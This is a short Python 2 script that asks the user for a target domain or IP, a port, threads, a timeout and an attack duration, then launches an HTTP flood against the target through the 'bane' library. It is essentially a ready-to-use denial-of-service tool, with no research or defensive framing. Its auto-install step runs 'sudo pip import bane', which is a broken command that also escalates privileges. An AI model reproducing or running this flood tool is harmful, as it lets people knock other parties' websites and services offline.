import os,sys
try:
 import bane
except:
 print"Failed to import a module.\nLet me install it for you.. (if you are using linux you have to execute it as root to install the required module)"
 if os.path.isdir('/home')==True:
  os.system('sudo pip import bane')
 else:
  os.system('pip import bane')
import socket
n=0
while(n<1):
 try:
  u=raw_input('\nTarget Domain/IP: (www.google.com)\n> ')
  socket.gethostbyname(u)
  n+=1
 except:
  pass
while(n<2):
 try:
  p=input('Port:\n>')
  n+=1
 except:
  pass
while(n<3):
 try:
  th=input('Threads:\n>')
  n+=1
 except:
  pass
while(n<4):
 try:
  ti=input('Timeout:\n>')
  n+=1
 except:
  pass
while(n<5):
 try:
  d=input('Attack\'s duration (in seconds):\n>')
  n+=1
 except:
  pass
try:
 bane.httpflood(u,p=p,maxtime=ti,threads=th,interval=d,level=2)
except KeyboardInterrupt:
 bane.ddos.stop=True

